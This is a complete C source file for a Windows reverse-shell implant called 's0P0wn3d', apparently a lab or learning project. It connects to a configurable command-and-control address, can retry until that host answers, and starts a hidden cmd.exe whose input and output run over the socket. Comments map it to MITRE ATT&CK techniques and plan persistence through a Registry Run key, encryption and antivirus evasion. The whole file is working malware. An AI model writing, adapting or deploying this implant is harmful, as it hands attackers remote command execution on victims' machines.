#include <winsock2.h>
#include <windows.h>
#include <io.h>
#include <process.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* ================================================== */
/* CHANGE THIS TO THE C2 IP AND PORT AT COMPILE TIME  */
/* Example: -DCLIENT_IP=\"192.168.56.104\"            */
/*          -DCLIENT_PORT=4444                        */
/* ================================================== */
#if !defined(CLIENT_IP) || !defined(CLIENT_PORT)
# define CLIENT_IP   (char*)"0.0.0.0"
# define CLIENT_PORT (int)0
#endif
/* ================================================== */

/*
 * s0P0wn3d — Reverse Shell Implant (Phase 1 - No encryption)
 *
 * Connects back to the C2 server and spawns cmd.exe,
 * redirecting its STDIN/STDOUT/STDERR to the socket.
 *
 * MITRE ATT&CK:
 *   T1059.003 - Command and Scripting Interpreter: Windows Command Shell
 *   T1071.001 - Application Layer Protocol: Web Protocols
 *
 * Known weaknesses (Phase 1):
 *   - Communications in plaintext (visible in Wireshark)
 *   - No persistence (reboot = lose implant)
 *   - No AV evasion
 * Next steps (Phase 2):
 *   - AES-256-CBC + RSA key exchange
 *   - Registry Run Key persistence
 *   - String obfuscation
 */

int main(void) {
    /* Validate config */
    if (strcmp(CLIENT_IP, "0.0.0.0") == 0 || CLIENT_PORT == 0) {
        write(2, "[ERROR] CLIENT_IP and/or CLIENT_PORT not defined.\n", 50);
        return (1);
    }

    /* Initialize Winsock */
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        write(2, "[ERROR] WSAStartup failed.\n", 27);
        return (1);
    }

    /* Connect to C2 server */
    int port = CLIENT_PORT;
    struct sockaddr_in sa;
    SOCKET sockt = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    sa.sin_addr.s_addr = inet_addr(CLIENT_IP);

#ifdef WAIT_FOR_CLIENT
    /* Retry until C2 is available */
    while (connect(sockt, (struct sockaddr *)&sa, sizeof(sa)) != 0) {
        Sleep(5000);
    }
#else
    if (connect(sockt, (struct sockaddr *)&sa, sizeof(sa)) != 0) {
        write(2, "[ERROR] connect failed.\n", 24);
        return (1);
    }
#endif

    /* Spawn cmd.exe with socket as stdin/stdout/stderr */
    STARTUPINFO sinfo;
    memset(&sinfo, 0, sizeof(sinfo));
    sinfo.cb         = sizeof(sinfo);
    sinfo.dwFlags    = STARTF_USESTDHANDLES;
    sinfo.hStdInput  = (HANDLE)sockt;
    sinfo.hStdOutput = (HANDLE)sockt;
    sinfo.hStdError  = (HANDLE)sockt;
    PROCESS_INFORMATION pinfo;

    CreateProcessA(NULL, "cmd", NULL, NULL, TRUE,
                   CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);

    return (0);
}
